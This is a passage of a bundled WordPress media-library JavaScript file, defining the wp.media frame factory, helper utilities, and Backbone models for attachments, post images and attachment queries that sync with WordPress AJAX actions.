(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
/*globals wp, _, jQuery */

var $ = jQuery,
	Attachment, Attachments, l10n, media;

window.wp = window.wp || {};

/**
 * Create and return a media frame.
 *
 * Handles the default media experience.
 *
 * @param  {object} attributes The properties passed to the main media controller.
 * @return {wp.media.view.MediaFrame} A media workflow.
 */
media = wp.media = function( attributes ) {
	var MediaFrame = media.view.MediaFrame,
		frame;

	if ( ! MediaFrame ) {
		return;
	}

	attributes = _.defaults( attributes || {}, {
		frame: 'select'
	});

	if ( 'select' === attributes.frame && MediaFrame.Select ) {
		frame = new MediaFrame.Select( attributes );
	} else if ( 'post' === attributes.frame && MediaFrame.Post ) {
		frame = new MediaFrame.Post( attributes );
	} else if ( 'manage' === attributes.frame && MediaFrame.Manage ) {
		frame = new MediaFrame.Manage( attributes );
	} else if ( 'image' === attributes.frame && MediaFrame.ImageDetails ) {
		frame = new MediaFrame.ImageDetails( attributes );
	} else if ( 'audio' === attributes.frame && MediaFrame.AudioDetails ) {
		frame = new MediaFrame.AudioDetails( attributes );
	} else if ( 'video' === attributes.frame && MediaFrame.VideoDetails ) {
		frame = new MediaFrame.VideoDetails( attributes );
	} else if ( 'edit-attachments' === attributes.frame && MediaFrame.EditAttachments ) {
		frame = new MediaFrame.EditAttachments( attributes );
	}

	delete attributes.frame;

	media.frame = frame;

	return frame;
};

_.extend( media, { model: {}, view: {}, controller: {}, frames: {} });

// Link any localized strings.
l10n = media.model.l10n = window._wpMediaModelsL10n || {};

// Link any settings.
media.model.settings = l10n.settings || {};
delete l10n.settings;

Attachment = media.model.Attachment = require( './models/attachment.js' );
Attachments = media.model.Attachments = require( './models/attachments.js' );

media.model.Query = require( './models/query.js' );
media.model.PostImage = require( './models/post-image.js' );
media.model.Selection = require( './models/selection.js' );

/**
 * ========================================================================
 * UTILITIES
 * ========================================================================
 */

/**
 * A basic equality comparator for Backbone models.
 *
 * Used to order models within a collection - @see wp.media.model.Attachments.comparator().
 *
 * @param  {mixed}  a  The primary parameter to compare.
 * @param  {mixed}  b  The primary parameter to compare.
 * @param  {string} ac The fallback parameter to compare, a's cid.
 * @param  {string} bc The fallback parameter to compare, b's cid.
 * @return {number}    -1: a should come before b.
 *                      0: a and b are of the same rank.
 *                      1: b should come before a.
 */
media.compare = function( a, b, ac, bc ) {
	if ( _.isEqual( a, b ) ) {
		return ac === bc ? 0 : (ac > bc ? -1 : 1);
	} else {
		return a > b ? -1 : 1;
	}
};

_.extend( media, {
	/**
	 * media.template( id )
	 *
	 * Fetch a JavaScript template for an id, and return a templating function for it.
	 *
	 * See wp.template() in `wp-includes/js/wp-util.js`.
	 *
	 * @borrows wp.template as template
	 */
	template: wp.template,

	/**
	 * media.post( [action], [data] )
	 *
	 * Sends a POST request to WordPress.
	 * See wp.ajax.post() in `wp-includes/js/wp-util.js`.
	 *
	 * @borrows wp.ajax.post as post
	 */
	post: wp.ajax.post,

	/**
	 * media.ajax( [action], [options] )
	 *
	 * Sends an XHR request to WordPress.
	 * See wp.ajax.send() in `wp-includes/js/wp-util.js`.
	 *
	 * @borrows wp.ajax.send as ajax
	 */
	ajax: wp.ajax.send,

	/**
	 * Scales a set of dimensions to fit within bounding dimensions.
	 *
	 * @param {Object} dimensions
	 * @returns {Object}
	 */
	fit: function( dimensions ) {
		var width     = dimensions.width,
			height    = dimensions.height,
			maxWidth  = dimensions.maxWidth,
			maxHeight = dimensions.maxHeight,
			constraint;

		// Compare ratios between the two values to determine which
		// max to constrain by. If a max value doesn't exist, then the
		// opposite side is the constraint.
		if ( ! _.isUndefined( maxWidth ) && ! _.isUndefined( maxHeight ) ) {
			constraint = ( width / height > maxWidth / maxHeight ) ? 'width' : 'height';
		} else if ( _.isUndefined( maxHeight ) ) {
			constraint = 'width';
		} else if (  _.isUndefined( maxWidth ) && height > maxHeight ) {
			constraint = 'height';
		}

		// If the value of the constrained side is larger than the max,
		// then scale the values. Otherwise return the originals; they fit.
		if ( 'width' === constraint && width > maxWidth ) {
			return {
				width : maxWidth,
				height: Math.round( maxWidth * height / width )
			};
		} else if ( 'height' === constraint && height > maxHeight ) {
			return {
				width : Math.round( maxHeight * width / height ),
				height: maxHeight
			};
		} else {
			return {
				width : width,
				height: height
			};
		}
	},
	/**
	 * Truncates a string by injecting an ellipsis into the middle.
	 * Useful for filenames.
	 *
	 * @param {String} string
	 * @param {Number} [length=30]
	 * @param {String} [replacement=&hellip;]
	 * @returns {String} The string, unless length is greater than string.length.
	 */
	truncate: function( string, length, replacement ) {
		length = length || 30;
		replacement = replacement || '&hellip;';

		if ( string.length <= length ) {
			return string;
		}

		return string.substr( 0, length / 2 ) + replacement + string.substr( -1 * length / 2 );
	}
});

/**
 * ========================================================================
 * MODELS
 * ========================================================================
 */
/**
 * wp.media.attachment
 *
 * @static
 * @param {String} id A string used to identify a model.
 * @returns {wp.media.model.Attachment}
 */
media.attachment = function( id ) {
	return Attachment.get( id );
};

/**
 * A collection of all attachments that have been fetched from the server.
 *
 * @static
 * @member {wp.media.model.Attachments}
 */
Attachments.all = new Attachments();

/**
 * wp.media.query
 *
 * Shorthand for creating a new Attachments Query.
 *
 * @param {object} [props]
 * @returns {wp.media.model.Attachments}
 */
media.query = function( props ) {
	return new Attachments( null, {
		props: _.extend( _.defaults( props || {}, { orderby: 'date' } ), { query: true } )
	});
};

// Clean up. Prevents mobile browsers caching
$(window).on('unload', function(){
	window.wp = null;
});

},{"./models/attachment.js":2,"./models/attachments.js":3,"./models/post-image.js":4,"./models/query.js":5,"./models/selection.js":6}],2:[function(require,module,exports){
/*globals wp, _, Backbone */

/**
 * wp.media.model.Attachment
 *
 * @class
 * @augments Backbone.Model
 */
var $ = Backbone.$,
	Attachment;

Attachment = Backbone.Model.extend({
	/**
	 * Triggered when attachment details change
	 * Overrides Backbone.Model.sync
	 *
	 * @param {string} method
	 * @param {wp.media.model.Attachment} model
	 * @param {Object} [options={}]
	 *
	 * @returns {Promise}
	 */
	sync: function( method, model, options ) {
		// If the attachment does not yet have an `id`, return an instantly
		// rejected promise. Otherwise, all of our requests will fail.
		if ( _.isUndefined( this.id ) ) {
			return $.Deferred().rejectWith( this ).promise();
		}

		// Overload the `read` request so Attachment.fetch() functions correctly.
		if ( 'read' === method ) {
			options = options || {};
			options.context = this;
			options.data = _.extend( options.data || {}, {
				action: 'get-attachment',
				id: this.id
			});
			return wp.media.ajax( options );

		// Overload the `update` request so properties can be saved.
		} else if ( 'update' === method ) {
			// If we do not have the necessary nonce, fail immeditately.
			if ( ! this.get('nonces') || ! this.get('nonces').update ) {
				return $.Deferred().rejectWith( this ).promise();
			}

			options = options || {};
			options.context = this;

			// Set the action and ID.
			options.data = _.extend( options.data || {}, {
				action:  'save-attachment',
				id:      this.id,
				nonce:   this.get('nonces').update,
				post_id: wp.media.model.settings.post.id
			});

			// Record the values of the changed attributes.
			if ( model.hasChanged() ) {
				options.data.changes = {};

				_.each( model.changed, function( value, key ) {
					options.data.changes[ key ] = this.get( key );
				}, this );
			}

			return wp.media.ajax( options );

		// Overload the `delete` request so attachments can be removed.
		// This will permanently delete an attachment.
		} else if ( 'delete' === method ) {
			options = options || {};

			if ( ! options.wait ) {
				this.destroyed = true;
			}

			options.context = this;
			options.data = _.extend( options.data || {}, {
				action:   'delete-post',
				id:       this.id,
				_wpnonce: this.get('nonces')['delete']
			});

			return wp.media.ajax( options ).done( function() {
				this.destroyed = true;
			}).fail( function() {
				this.destroyed = false;
			});

		// Otherwise, fall back to `Backbone.sync()`.
		} else {
			/**
			 * Call `sync` directly on Backbone.Model
			 */
			return Backbone.Model.prototype.sync.apply( this, arguments );
		}
	},
	/**
	 * Convert date strings into Date objects.
	 *
	 * @param {Object} resp The raw response object, typically returned by fetch()
	 * @returns {Object} The modified response object, which is the attributes hash
	 *    to be set on the model.
	 */
	parse: function( resp ) {
		if ( ! resp ) {
			return resp;
		}

		resp.date = new Date( resp.date );
		resp.modified = new Date( resp.modified );
		return resp;
	},
	/**
	 * @param {Object} data The properties to be saved.
	 * @param {Object} options Sync options. e.g. patch, wait, success, error.
	 *
	 * @this Backbone.Model
	 *
	 * @returns {Promise}
	 */
	saveCompat: function( data, options ) {
		var model = this;

		// If we do not have the necessary nonce, fail immeditately.
		if ( ! this.get('nonces') || ! this.get('nonces').update ) {
			return $.Deferred().rejectWith( this ).promise();
		}

		return wp.media.post( 'save-attachment-compat', _.defaults({
			id:      this.id,
			nonce:   this.get('nonces').update,
			post_id: wp.media.model.settings.post.id
		}, data ) ).done( function( resp, status, xhr ) {
			model.set( model.parse( resp, xhr ), options );
		});
	}
}, {
	/**
	 * Create a new model on the static 'all' attachments collection and return it.
	 *
	 * @static
	 * @param {Object} attrs
	 * @returns {wp.media.model.Attachment}
	 */
	create: function( attrs ) {
		var Attachments = wp.media.model.Attachments;
		return Attachments.all.push( attrs );
	},
	/**
	 * Create a new model on the static 'all' attachments collection and return it.
	 *
	 * If this function has already been called for the id,
	 * it returns the specified attachment.
	 *
	 * @static
	 * @param {string} id A string used to identify a model.
	 * @param {Backbone.Model|undefined} attachment
	 * @returns {wp.media.model.Attachment}
	 */
	get: _.memoize( function( id, attachment ) {
		var Attachments = wp.media.model.Attachments;
		return Attachments.all.push( attachment || { id: id } );
	})
});

module.exports = Attachment;

},{}],3:[function(require,module,exports){
/*globals wp, _, Backbone */

/**
 * wp.media.model.Attachments
 *
 * A collection of attachments.
 *
 * This collection has no persistence with the server without supplying
 * 'options.props.query = true', which will mirror the collection
 * to an Attachments Query collection - @see wp.media.model.Attachments.mirror().
 *
 * @class
 * @augments Backbone.Collection
 *
 * @param {array}  [models]                Models to initialize with the collection.
 * @param {object} [options]               Options hash for the collection.
 * @param {string} [options.props]         Options hash for the initial query properties.
 * @param {string} [options.props.order]   Initial order (ASC or DESC) for the collection.
 * @param {string} [options.props.orderby] Initial attribute key to order the collection by.
 * @param {string} [options.props.query]   Whether the collection is linked to an attachments query.
 * @param {string} [options.observe]
 * @param {string} [options.filters]
 *
 */
var Attachments = Backbone.Collection.extend({
	/**
	 * @type {wp.media.model.Attachment}
	 */
	model: wp.media.model.Attachment,
	/**
	 * @param {Array} [models=[]] Array of models used to populate the collection.
	 * @param {Object} [options={}]
	 */
	initialize: function( models, options ) {
		options = options || {};

		this.props   = new Backbone.Model();
		this.filters = options.filters || {};

		// Bind default `change` events to the `props` model.
		this.props.on( 'change', this._changeFilteredProps, this );

		this.props.on( 'change:order',   this._changeOrder,   this );
		this.props.on( 'change:orderby', this._changeOrderby, this );
		this.props.on( 'change:query',   this._changeQuery,   this );

		this.props.set( _.defaults( options.props || {} ) );

		if ( options.observe ) {
			this.observe( options.observe );
		}
	},
	/**
	 * Sort the collection when the order attribute changes.
	 *
	 * @access private
	 */
	_changeOrder: function() {
		if ( this.comparator ) {
			this.sort();
		}
	},
	/**
	 * Set the default comparator only when the `orderby` property is set.
	 *
	 * @access private
	 *
	 * @param {Backbone.Model} model
	 * @param {string} orderby
	 */
	_changeOrderby: function( model, orderby ) {
		// If a different comparator is defined, bail.
		if ( this.comparator && this.comparator !== Attachments.comparator ) {
			return;
		}

		if ( orderby && 'post__in' !== orderby ) {
			this.comparator = Attachments.comparator;
		} else {
			delete this.comparator;
		}
	},
	/**
	 * If the `query` property is set to true, query the server using
	 * the `props` values, and sync the results to this collection.
	 *
	 * @access private
	 *
	 * @param {Backbone.Model} model
	 * @param {Boolean} query
	 */
	_changeQuery: function( model, query ) {
		if ( query ) {
			this.props.on( 'change', this._requery, this );
			this._requery();
		} else {
			this.props.off( 'change', this._requery, this );
		}
	},
	/**
	 * @access private
	 *
	 * @param {Backbone.Model} model
	 */
	_changeFilteredProps: function( model ) {
		// If this is a query, updating the collection will be handled by
		// `this._requery()`.
		if ( this.props.get('query') ) {
			return;
		}

		var changed = _.chain( model.changed ).map( function( t, prop ) {
			var filter = Attachments.filters[ prop ],
				term = model.get( prop );

			if ( ! filter ) {
				return;
			}

			if ( term && ! this.filters[ prop ] ) {
				this.filters[ prop ] = filter;
			} else if ( ! term && this.filters[ prop ] === filter ) {
				delete this.filters[ prop ];
			} else {
				return;
			}

			// Record the change.
			return true;
		}, this ).any().value();

		if ( ! changed ) {
			return;
		}

		// If no `Attachments` model is provided to source the searches
		// from, then automatically generate a source from the existing
		// models.
		if ( ! this._source ) {
			this._source = new Attachments( this.models );
		}

		this.reset( this._source.filter( this.validator, this ) );
	},

	validateDestroyed: false,
	/**
	 * Checks whether an attachment is valid.
	 *
	 * @param {wp.media.model.Attachment} attachment
	 * @returns {Boolean}
	 */
	validator: function( attachment ) {
		if ( ! this.validateDestroyed && attachment.destroyed ) {
			return false;
		}
		return _.all( this.filters, function( filter ) {
			return !! filter.call( this, attachment );
		}, this );
	},
	/**
	 * Add or remove an attachment to the collection depending on its validity.
	 *
	 * @param {wp.media.model.Attachment} attachment
	 * @param {Object} options
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	validate: function( attachment, options ) {
		var valid = this.validator( attachment ),
			hasAttachment = !! this.get( attachment.cid );

		if ( ! valid && hasAttachment ) {
			this.remove( attachment, options );
		} else if ( valid && ! hasAttachment ) {
			this.add( attachment, options );
		}

		return this;
	},

	/**
	 * Add or remove all attachments from another collection depending on each one's validity.
	 *
	 * @param {wp.media.model.Attachments} attachments
	 * @param {object} [options={}]
	 *
	 * @fires wp.media.model.Attachments#reset
	 *
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	validateAll: function( attachments, options ) {
		options = options || {};

		_.each( attachments.models, function( attachment ) {
			this.validate( attachment, { silent: true });
		}, this );

		if ( ! options.silent ) {
			this.trigger( 'reset', this, options );
		}
		return this;
	},
	/**
	 * Start observing another attachments collection change events
	 * and replicate them on this collection.
	 *
	 * @param {wp.media.model.Attachments} The attachments collection to observe.
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining.
	 */
	observe: function( attachments ) {
		this.observers = this.observers || [];
		this.observers.push( attachments );

		attachments.on( 'add change remove', this._validateHandler, this );
		attachments.on( 'reset', this._validateAllHandler, this );
		this.validateAll( attachments );
		return this;
	},
	/**
	 * Stop replicating collection change events from another attachments collection.
	 *
	 * @param {wp.media.model.Attachments} The attachments collection to stop observing.
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	unobserve: function( attachments ) {
		if ( attachments ) {
			attachments.off( null, null, this );
			this.observers = _.without( this.observers, attachments );

		} else {
			_.each( this.observers, function( attachments ) {
				attachments.off( null, null, this );
			}, this );
			delete this.observers;
		}

		return this;
	},
	/**
	 * @access private
	 *
	 * @param {wp.media.model.Attachments} attachment
	 * @param {wp.media.model.Attachments} attachments
	 * @param {Object} options
	 *
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	_validateHandler: function( attachment, attachments, options ) {
		// If we're not mirroring this `attachments` collection,
		// only retain the `silent` option.
		options = attachments === this.mirroring ? options : {
			silent: options && options.silent
		};

		return this.validate( attachment, options );
	},
	/**
	 * @access private
	 *
	 * @param {wp.media.model.Attachments} attachments
	 * @param {Object} options
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	_validateAllHandler: function( attachments, options ) {
		return this.validateAll( attachments, options );
	},
	/**
	 * Start mirroring another attachments collection, clearing out any models already
	 * in the collection.
	 *
	 * @param {wp.media.model.Attachments} The attachments collection to mirror.
	 * @returns {wp.media.model.Attachments} Returns itself to allow chaining
	 */
	mirror: function( attachments ) {
		if ( this.mirroring && this.mirroring === attachments ) {
			return this;
		}

		this.unmirror();
		this.mirroring = attachments;

		// Clear the collection silently. A `reset` event will be fired
		// when `observe()` calls `validateAll()`.
		this.reset( [], { silent: true } );
		this.observe( attachments );

		return this;
	},
	/**
	 * Stop mirroring another attachments collection.
	 */
	unmirror: function() {
		if ( ! this.mirroring ) {
			return;
		}

		this.unobserve( this.mirroring );
		delete this.mirroring;
	},
	/**
	 * Retrive more attachments from the server for the collection.
	 *
	 * Only works if the collection is mirroring a Query Attachments collection,
	 * and forwards to its `more` method. This collection class doesn't have
	 * server persistence by itself.
	 *
	 * @param {object} options
	 * @returns {Promise}
	 */
	more: function( options ) {
		var deferred = jQuery.Deferred(),
			mirroring = this.mirroring,
			attachments = this;

		if ( ! mirroring || ! mirroring.more ) {
			return deferred.resolveWith( this ).promise();
		}
		// If we're mirroring another collection, forward `more` to
		// the mirrored collection. Account for a race condition by
		// checking if we're still mirroring that collection when
		// the request resolves.
		mirroring.more( options ).done( function() {
			if ( this === attachments.mirroring ) {
				deferred.resolveWith( this );
			}
		});

		return deferred.promise();
	},
	/**
	 * Whether there are more attachments that haven't been sync'd from the server
	 * that match the collection's query.
	 *
	 * Only works if the collection is mirroring a Query Attachments collection,
	 * and forwards to its `hasMore` method. This collection class doesn't have
	 * server persistence by itself.
	 *
	 * @returns {boolean}
	 */
	hasMore: function() {
		return this.mirroring ? this.mirroring.hasMore() : false;
	},
	/**
	 * A custom AJAX-response parser.
	 *
	 * See trac ticket #24753
	 *
	 * @param {Object|Array} resp The raw response Object/Array.
	 * @param {Object} xhr
	 * @returns {Array} The array of model attributes to be added to the collection
	 */
	parse: function( resp, xhr ) {
		if ( ! _.isArray( resp ) ) {
			resp = [resp];
		}

		return _.map( resp, function( attrs ) {
			var id, attachment, newAttributes;

			if ( attrs instanceof Backbone.Model ) {
				id = attrs.get( 'id' );
				attrs = attrs.attributes;
			} else {
				id = attrs.id;
			}

			attachment = wp.media.model.Attachment.get( id );
			newAttributes = attachment.parse( attrs, xhr );

			if ( ! _.isEqual( attachment.attributes, newAttributes ) ) {
				attachment.set( newAttributes );
			}

			return attachment;
		});
	},
	/**
	 * If the collection is a query, create and mirror an Attachments Query collection.
	 *
	 * @access private
	 */
	_requery: function( refresh ) {
		var props;
		if ( this.props.get('query') ) {
			props = this.props.toJSON();
			props.cache = ( true !== refresh );
			this.mirror( wp.media.model.Query.get( props ) );
		}
	},
	/**
	 * If this collection is sorted by `menuOrder`, recalculates and saves
	 * the menu order to the database.
	 *
	 * @returns {undefined|Promise}
	 */
	saveMenuOrder: function() {
		if ( 'menuOrder' !== this.props.get('orderby') ) {
			return;
		}

		// Removes any uploading attachments, updates each attachment's
		// menu order, and returns an object with an { id: menuOrder }
		// mapping to pass to the request.
		var attachments = this.chain().filter( function( attachment ) {
			return ! _.isUndefined( attachment.id );
		}).map( function( attachment, index ) {
			// Indices start at 1.
			index = index + 1;
			attachment.set( 'menuOrder', index );
			return [ attachment.id, index ];
		}).object().value();

		if ( _.isEmpty( attachments ) ) {
			return;
		}

		return wp.media.post( 'save-attachment-order', {
			nonce:       wp.media.model.settings.post.nonce,
			post_id:     wp.media.model.settings.post.id,
			attachments: attachments
		});
	}
}, {
	/**
	 * A function to compare two attachment models in an attachments collection.
	 *
	 * Used as the default comparator for instances of wp.media.model.Attachments
	 * and its subclasses. @see wp.media.model.Attachments._changeOrderby().
	 *
	 * @static
	 *
	 * @param {Backbone.Model} a
	 * @param {Backbone.Model} b
	 * @param {Object} options
	 * @returns {Number} -1 if the first model should come before the second,
	 *    0 if they are of the same rank and
	 *    1 if the first model should come after.
	 */
	comparator: function( a, b, options ) {
		var key   = this.props.get('orderby'),
			order = this.props.get('order') || 'DESC',
			ac    = a.cid,
			bc    = b.cid;

		a = a.get( key );
		b = b.get( key );

		if ( 'date' === key || 'modified' === key ) {
			a = a || new Date();
			b = b || new Date();
		}

		// If `options.ties` is set, don't enforce the `cid` tiebreaker.
		if ( options && options.ties ) {
			ac = bc = null;
		}

		return ( 'DESC' === order ) ? wp.media.compare( a, b, ac, bc ) : wp.media.compare( b, a, bc, ac );
	},
	/**
	 * @namespace
	 */
	filters: {
		/**
		 * @static
		 * Note that this client-side searching is *not* equivalent
		 * to our server-side searching.
		 *
		 * @param {wp.media.model.Attachment} attachment
		 *
		 * @this wp.media.model.Attachments
		 *
		 * @returns {Boolean}
		 */
		search: function( attachment ) {
			if ( ! this.props.get('search') ) {
				return true;
			}

			return _.any(['title','filename','description','caption','name'], function( key ) {
				var value = attachment.get( key );
				return value && -1 !== value.search( this.props.get('search') );
			}, this );
		},
		/**
		 * @static
		 * @param {wp.media.model.Attachment} attachment
		 *
		 * @this wp.media.model.Attachments
		 *
		 * @returns {Boolean}
		 */
		type: function( attachment ) {
			var type = this.props.get('type');
			return ! type || -1 !== type.indexOf( attachment.get('type') );
		},
		/**
		 * @static
		 * @param {wp.media.model.Attachment} attachment
		 *
		 * @this wp.media.model.Attachments
		 *
		 * @returns {Boolean}
		 */
		uploadedTo: function( attachment ) {
			var uploadedTo = this.props.get('uploadedTo');
			if ( _.isUndefined( uploadedTo ) ) {
				return true;
			}

			return uploadedTo === attachment.get('uploadedTo');
		},
		/**
		 * @static
		 * @param {wp.media.model.Attachment} attachment
		 *
		 * @this wp.media.model.Attachments
		 *
		 * @returns {Boolean}
		 */
		status: function( attachment ) {
			var status = this.props.get('status');
			if ( _.isUndefined( status ) ) {
				return true;
			}

			return status === attachment.get('status');
		}
	}
});

module.exports = Attachments;

},{}],4:[function(require,module,exports){
/*globals Backbone */

/**
 * wp.media.model.PostImage
 *
 * An instance of an image that's been embedded into a post.
 *
 * Used in the embedded image attachment display settings modal - @see wp.media.view.MediaFrame.ImageDetails.
 *
 * @class
 * @augments Backbone.Model
 *
 * @param {int} [attributes]               Initial model attributes.
 * @param {int} [attributes.attachment_id] ID of the attachment.
 **/
var PostImage = Backbone.Model.extend({

	initialize: function( attributes ) {
		var Attachment = wp.media.model.Attachment;
		this.attachment = false;

		if ( attributes.attachment_id ) {
			this.attachment = Attachment.get( attributes.attachment_id );
			if ( this.attachment.get( 'url' ) ) {
				this.dfd = jQuery.Deferred();
				this.dfd.resolve();
			} else {
				this.dfd = this.attachment.fetch();
			}
			this.bindAttachmentListeners();
		}

		// keep url in sync with changes to the type of link
		this.on( 'change:link', this.updateLinkUrl, this );
		this.on( 'change:size', this.updateSize, this );

		this.setLinkTypeFromUrl();
		this.setAspectRatio();

		this.set( 'originalUrl', attributes.url );
	},

	bindAttachmentListeners: function() {
		this.listenTo( this.attachment, 'sync', this.setLinkTypeFromUrl );
		this.listenTo( this.attachment, 'sync', this.setAspectRatio );
		this.listenTo( this.attachment, 'change', this.updateSize );
	},

	changeAttachment: function( attachment, props ) {
		this.stopListening( this.attachment );
		this.attachment = attachment;
		this.bindAttachmentListeners();

		this.set( 'attachment_id', this.attachment.get( 'id' ) );
		this.set( 'caption', this.attachment.get( 'caption' ) );
		this.set( 'alt', this.attachment.get( 'alt' ) );
		this.set( 'size', props.get( 'size' ) );
		this.set( 'align', props.get( 'align' ) );
		this.set( 'link', props.get( 'link' ) );
		this.updateLinkUrl();
		this.updateSize();
	},

	setLinkTypeFromUrl: function() {
		var linkUrl = this.get( 'linkUrl' ),
			type;

		if ( ! linkUrl ) {
			this.set( 'link', 'none' );
			return;
		}

		// default to custom if there is a linkUrl
		type = 'custom';

		if ( this.attachment ) {
			if ( this.attachment.get( 'url' ) === linkUrl ) {
				type = 'file';
			} else if ( this.attachment.get( 'link' ) === linkUrl ) {
				type = 'post';
			}
		} else {
			if ( this.get( 'url' ) === linkUrl ) {
				type = 'file';
			}
		}

		this.set( 'link', type );
	},

	updateLinkUrl: function() {
		var link = this.get( 'link' ),
			url;

		switch( link ) {
			case 'file':
				if ( this.attachment ) {
					url = this.attachment.get( 'url' );
				} else {
					url = this.get( 'url' );
				}
				this.set( 'linkUrl', url );
				break;
			case 'post':
				this.set( 'linkUrl', this.attachment.get( 'link' ) );
				break;
			case 'none':
				this.set( 'linkUrl', '' );
				break;
		}
	},

	updateSize: function() {
		var size;

		if ( ! this.attachment ) {
			return;
		}

		if ( this.get( 'size' ) === 'custom' ) {
			this.set( 'width', this.get( 'customWidth' ) );
			this.set( 'height', this.get( 'customHeight' ) );
			this.set( 'url', this.get( 'originalUrl' ) );
			return;
		}

		size = this.attachment.get( 'sizes' )[ this.get( 'size' ) ];

		if ( ! size ) {
			return;
		}

		this.set( 'url', size.url );
		this.set( 'width', size.width );
		this.set( 'height', size.height );
	},

	setAspectRatio: function() {
		var full;

		if ( this.attachment && this.attachment.get( 'sizes' ) ) {
			full = this.attachment.get( 'sizes' ).full;

			if ( full ) {
				this.set( 'aspectRatio', full.width / full.height );
				return;
			}
		}

		this.set( 'aspectRatio', this.get( 'customWidth' ) / this.get( 'customHeight' ) );
	}
});

module.exports = PostImage;

},{}],5:[function(require,module,exports){
/*globals wp, _ */

/**
 * wp.media.model.Query
 *
 * A collection of attachments that match the supplied query arguments.
 *
 * Note: Do NOT change this.args after the query has been initialized.
 *       Things will break.
 *
 * @class
 * @augments wp.media.model.Attachments
 * @augments Backbone.Collection
 *
 * @param {array}  [models]                      Models to initialize with the collection.
 * @param {object} [options]                     Options hash.
 * @param {object} [options.args]                Attachments query arguments.
 * @param {object} [options.args.posts_per_page]
 */
var Attachments = wp.media.model.Attachments,
	Query;

Query = Attachments.extend({
	/**
	 * @global wp.Uploader
	 *
	 * @param {array}  [models=[]]  Array of initial models to populate the collection.
	 * @param {object} [options={}]
	 */
	initialize: function( models, options ) {
		var allowed;

		options = options || {};
		Attachments.prototype.initialize.apply( this, arguments );

		this.args     = options.args;
		this._hasMore = true;
		this.created  = new Date();

		this.filters.order = function( attachment ) {
			var orderby = this.props.get('orderby'),
				order = this.props.get('order');

			if ( ! this.comparator ) {
				return true;
			}

			// We want any items that can be placed before the last
			// item in the set. If we add any items after the last
			// item, then we can't guarantee the set is complete.
			if ( this.length ) {
				return 1 !== this.comparator( attachment, this.last(), { ties: true });

			// Handle the case where there are no items yet and
			// we're sorting for recent items. In that case, we want
			// changes that occurred after we created the query.
			} else if ( 'DESC' === order && ( 'date' === orderby || 'modified' === orderby ) ) {
				return attachment.get( orderby ) >= this.created;

			// If we're sorting by menu order and we have no items,
			// accept any items that have the default menu order (0).
			} else if ( 'ASC' === order && 'menuOrder' === orderby ) {
				return attachment.get( orderby ) === 0;
			}

			// Otherwise, we don't want any items yet.
			return false;
		};

		// Observe the central `wp.Uploader.queue` collection to watch for
		// new matches for the query.
		//
		// Only observe when a limited number of query args are set. There
		// are no filters for other properties, so observing will result in
		// false positives in those queries.
		allowed = [ 's', 'order', 'orderby', 'posts_per_page', 'post_mime_type', 'post_parent' ];
		if ( wp.Uploader && _( this.args ).chain().keys().difference( allowed ).isEmpty().value() ) {
			this.observe( wp.Uploader.queue );
		}
	},
	/**
	 * Whether there are more attachments that haven't been sync'd from the server
	 * that match the collection's query.
	 *
	 * @returns {boolean}
	 */
	hasMore: function() {
		return this._hasMore;
	},
	/**
	 * Fetch more attachments from the server for the collection.
	 *
	 * @param   {object}  [options={}]
	 * @returns {Promise}
	 */
	more: function( options ) {
		var query = this;

		// If there is already a request pending, return early with the Deferred object.
		if ( this._more && 'pending' === this._more.state() ) {
			return this._more;
		}

		if ( ! this.hasMore() ) {
			return jQuery.Deferred().resolveWith( this ).promise();
		}

		options = options || {};
		options.remove = false;

		return this._more = this.fetch( options ).done( function( resp ) {
			if ( _.isEmpty( resp ) || -1 === this.args.posts_per_page || resp.length < this.args.posts_per_page ) {
				query._hasMore = false;
			}
		});
	},
	/**
	 * Overrides Backbone.Collection.sync
	 * Overrides wp.media.model.Attachments.sync
	 *
	 * @param {String} method
	 * @param {Backbone.Model} model
	 * @param {Object} [options={}]
	 * @returns {Promise}
	 */
	sync: function( method, model, options ) {
		var args, fallback;

		// Overload the read method so Attachment.fetch() functions correctly.
		if ( 'read' === method ) {
			options = options || {};
			options.context = this;
			options.data = _.extend( options.data || {}, {
				action:  'query-attachments',
				post_id: wp.media.model.settings.post.id
			});

			// Clone the args so manipulation is non-destructive.
			args = _.clone( this.args );

			// Determine which page to query.
			if ( -1 !== args.posts_per_page ) {
				args.paged = Math.round( this.length / args.posts_per_page ) + 1;
			}

			options.data.query = args;
			return wp.media.ajax( options );

		// Otherwise, fall back to Backbone.sync()
		} else {
			/**
			 * Call wp.media.model.Attachments.sync or Backbone.sync
			 */
			fallback = Attachments.prototype.sync ? Attachments.prototype : Backbone;
			return fallback.sync.apply( this, arguments );
		}
	}
}, {
	/**
	 * @readonly
	 */
	defaultProps: {
		orderby: 'date',
		order:   'DESC'
	},
	/**
	 * @readonly
	 */
	defaultArgs: {
		posts_per_page: 40
	},
	/**
	 * @readonly
	 */
	orderby: {
		allowed:  [ 'name', 'author', 'date', 'title', 'modified', 'uploadedTo', 'id', 'post__in', 'menuOrder' ],
		/**
		 * A map of JavaScript orderby values to their WP_Query equivalents.
		 * @type {Object}
		 */
		valuemap: {
			'id':         'ID',
			'uploadedTo': 'parent',
			'menuOrder':  'menu_order ID'
		}
	},
	/**
	 * A map of JavaScript query properties to their WP_Query equivalents.
	 *
	 * @readonly
	 */
	propmap: {
		'search':    's',
		'type':      'post_mime_type',
		'perPage':   'posts_per_page',
		'menuOrder': 'menu_order',
		'uploadedTo': 'post_parent',
		'status':     'post_status',
		'include':    'post__in',
		'exclude':    'post__not_in'
	},
	/**
	 * Creates and returns an Attachments Query collection given the properties.
	 *
	 * Caches query objects and reuses where possible.
	 *
	 * @static
	 * @method
	 *
	 * @param {object} [props]
	 * @param {Object} [props.cache=true]   Whether to use the query cache or not.
	 * @param {Object} [props.order]
	 * @param {Object} [props.orderby]
